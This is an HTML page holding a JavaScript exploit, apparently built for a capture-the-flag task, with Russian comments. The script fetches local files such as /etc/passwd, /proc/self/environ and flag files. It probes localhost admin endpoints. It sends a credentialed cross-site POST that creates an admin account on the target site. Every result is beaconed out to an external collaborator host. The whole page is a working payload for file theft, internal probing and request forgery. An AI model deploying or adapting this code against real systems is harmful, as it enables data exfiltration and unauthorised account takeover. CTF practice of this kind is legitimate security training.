<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// 1. Пробуем читать локальные файлы
const filesToRead = [
    'file:///etc/passwd',
    'file:///etc/hosts', 
    'file:///proc/self/environ',
    'file:///flag',
    'file:///app/flag.txt',
    'file:///home/flag',
    'file:///var/www/html/flag.txt'
];

filesToRead.forEach(file => {
    setTimeout(() => {
        fetch(file)
            .then(r => r.text())
            .then(data => {
                // Отправляем данные на collaborator
                new Image().src = `${COLLAB}/?file=${encodeURIComponent(file)}&data=${encodeURIComponent(data.substring(0, 2000))}`;
            })
            .catch(e => {
                new Image().src = `${COLLAB}/?file=${encodeURIComponent(file)}&error=${encodeURIComponent(e.toString())}`;
            });
    }, Math.random() * 3000);
});

// 2. Пробуем получить доступ к localhost
const localEndpoints = [
    'http://localhost/admin',
    'http://127.0.0.1/admin',
    'http://localhost:80/admin',
    'http://localhost:3000/',
    'http://localhost:8080/'
];

localEndpoints.forEach(url => {
    setTimeout(() => {
        fetch(url)
            .then(r => r.text())
            .then(data => {
                new Image().src = `${COLLAB}/?local=${encodeURIComponent(url)}&data=${encodeURIComponent(data.substring(0, 1500))}`;
            })
            .catch(e => {
                new Image().src = `${COLLAB}/?local=${encodeURIComponent(url)}&error=${encodeURIComponent(e.message)}`;
            });
    }, Math.random() * 5000 + 3000);
});

// 3. Пробуем создать админа на целевом сайте (если куки есть)
setTimeout(() => {
    fetch('https://tasks.goidactf.ru:20499/create_admin', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        credentials: 'include',
        body: 'new_admin_login=GITHUB_PAGES_EXPLOIT'
    })
    .then(r => {
        new Image().src = `${COLLAB}/?create_admin_status=${r.status}`;
    })
    .catch(e => {
        new Image().src = `${COLLAB}/?create_admin_error=${encodeURIComponent(e.toString())}`;
    });
}, 8000);
</script>
</body>
</html>
